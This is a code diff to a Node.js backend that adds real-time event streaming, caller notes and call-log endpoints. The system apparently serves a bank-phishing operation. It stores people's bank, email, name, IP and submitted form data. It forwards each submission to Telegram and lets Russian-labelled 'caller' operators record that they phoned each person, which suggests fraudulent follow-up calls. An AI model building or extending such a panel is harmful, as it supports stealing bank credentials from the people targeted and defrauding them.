@@ -17,6 +17,16 @@ import { randomUUID } from 'node:crypto';
 const adminSessions = new Set();
 const callerSessions = new Set();
 
+// ── SSE broadcast ─────────────────────────────────────────────────────────────
+const sseClients = new Set();
+
+function broadcastUpdate(type = 'clients_changed') {
+  const msg = `data: ${JSON.stringify({ type })}\n\n`;
+  for (const raw of [...sseClients]) {
+    try { raw.write(msg); } catch { sseClients.delete(raw); }
+  }
+}
+
 function requireAdmin(req, reply) {
   const auth = req.headers['authorization'] || '';
   const token = auth.startsWith('Bearer ') ? auth.slice(7).trim() : '';
@@ -406,6 +416,7 @@ async function handleCallRequest(req, reply) {
       `IP: \`${ip}\`${country ? ' · ' + country : ''}`,
     ].filter(Boolean);
     sendToTelegram(lines.join('\n'));
+    broadcastUpdate('clients_changed');
 
     return reply.send({ ok: true });
   } catch (err) {
@@ -500,6 +511,8 @@ async function handleCallerClients(req, reply) {
         id: true, flowSessionId: true, email: true, bank: true,
         nombre: true, ip: true, status: true,
         operatorCalled: true, calledAt: true, createdAt: true,
+        callerNote: true, submissionData: true,
+        events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
       },
     });
     return reply.send({ clients });
@@ -513,16 +526,110 @@ async function handleCallerMarkCalled(req, reply) {
   if (!requireCaller(req, reply)) return;
   try {
     const id = sanitizeString(req.params.id || '', 40);
+    const now = new Date();
     const client = await prisma.webClient.update({
       where: { id },
-      data: { operatorCalled: true, calledAt: new Date(), status: 'ОПЕРАТОР ПРОЗВОНИЛ' },
+      data: { operatorCalled: true, calledAt: now, status: 'ОПЕРАТОР ПРОЗВОНИЛ' },
     });
+    // Create a call log entry for audit history
+    await prisma.callLog.create({ data: { clientId: id, note: 'Первичный звонок' } }).catch(() => {});
     sendToTelegram(`*✅ ОПЕРАТОР ПРОЗВОНИЛ*\nSession: \`${client.flowSessionId}\`\nБанк: *${client.bank || '—'}*\nEmail: ${client.email || '—'}`);
+    broadcastUpdate('clients_changed');
     return reply.send({ ok: true });
   } catch (err) {
     console.error('[caller-mark] error:', err?.message || err);
     return reply.status(500).send({ error: 'server_error' });
   }
+}
+
+async function handleCallerNote(req, reply) {
+  if (!requireCaller(req, reply)) return;
+  try {
+    const id = sanitizeString(req.params.id || '', 40);
+    const body = asRecord(req.body) ?? {};
+    const note = sanitizeString(getString(body.note), 2000);
+    await prisma.webClient.update({ where: { id }, data: { callerNote: note || null } });
+    broadcastUpdate('clients_changed');
+    return reply.send({ ok: true });
+  } catch (err) {
+    console.error('[caller-note] error:', err?.message || err);
+    return reply.status(500).send({ error: 'server_error' });
+  }
+}
+
+async function handleGetCallLogs(req, reply) {
+  if (!requireCaller(req, reply)) return;
+  try {
+    const logs = await prisma.callLog.findMany({
+      orderBy: { createdAt: 'desc' },
+      take: 300,
+      include: {
+        client: {
+          select: { id: true, flowSessionId: true, nombre: true, email: true, bank: true, ip: true, status: true },
+        },
+      },
+    });
+    // Also return clients that have callRequested for the "add log" form
+    const clients = await prisma.webClient.findMany({
+      where: { callRequested: true },
+      orderBy: { updatedAt: 'desc' },
+      select: { id: true, nombre: true, email: true, bank: true },
+    });
+    return reply.send({ logs, clients });
+  } catch (err) {
+    console.error('[call-logs] error:', err?.message || err);
+    return reply.status(500).send({ error: 'server_error' });
+  }
+}
+
+async function handleAddCallLog(req, reply) {
+  if (!requireCaller(req, reply)) return;
+  try {
+    const body = asRecord(req.body) ?? {};
+    const clientId = sanitizeString(getString(body.clientId), 40);
+    const note = sanitizeString(getString(body.note), 2000);
+    if (!clientId) return reply.status(400).send({ error: 'clientId required' });
+    const log = await prisma.callLog.create({ data: { clientId, note: note || null } });
+    broadcastUpdate('logs_changed');
+    return reply.send({ ok: true, log });
+  } catch (err) {
+    console.error('[add-call-log] error:', err?.message || err);
+    return reply.status(500).send({ error: 'server_error' });
+  }
+}
+
+async function handleMarkCallLog(req, reply) {
+  if (!requireCaller(req, reply)) return;
+  try {
+    const id = sanitizeString(req.params.id || '', 40);
+    await prisma.callLog.update({ where: { id }, data: { markedAt: new Date() } });
+    broadcastUpdate('logs_changed');
+    return reply.send({ ok: true });
+  } catch (err) {
+    console.error('[mark-call-log] error:', err?.message || err);
+    return reply.status(500).send({ error: 'server_error' });
+  }
+}
+
+async function handleSSE(req, reply) {
+  const token = sanitizeString(String(req.query.token || ''), 120);
+  if (!token || (!adminSessions.has(token) && !callerSessions.has(token))) {
+    return reply.status(401).send({ error: 'Unauthorized' });
+  }
+  reply.hijack();
+  const raw = reply.raw;
+  raw.writeHead(200, {
+    'Content-Type': 'text/event-stream',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'X-Accel-Buffering': 'no',
+  });
+  raw.write('data: {"type":"connected"}\n\n');
+  sseClients.add(raw);
+  const ping = setInterval(() => {
+    try { raw.write(':ping\n\n'); } catch { clearInterval(ping); sseClients.delete(raw); }
+  }, 20000);
+  req.raw.on('close', () => { clearInterval(ping); sseClients.delete(raw); });
 }
 
 // ─── Full admin: clients list ─────────────────────────────────────────────────
@@ -749,4 +856,11 @@ export async function registerApiRoutes(app) {
   app.post('/api/caller/login', handleCallerLogin);
   app.get('/api/caller/clients', handleCallerClients);
   app.post('/api/caller/clients/:id/called', handleCallerMarkCalled);
+  app.put('/api/caller/clients/:id/note', handleCallerNote);
+  app.get('/api/caller/call-logs', handleGetCallLogs);
+  app.post('/api/caller/call-logs', handleAddCallLog);
+  app.post('/api/caller/call-logs/:id/mark', handleMarkCallLog);
+
+  // SSE for real-time updates
+  app.get('/api/sse', handleSSE);
 }
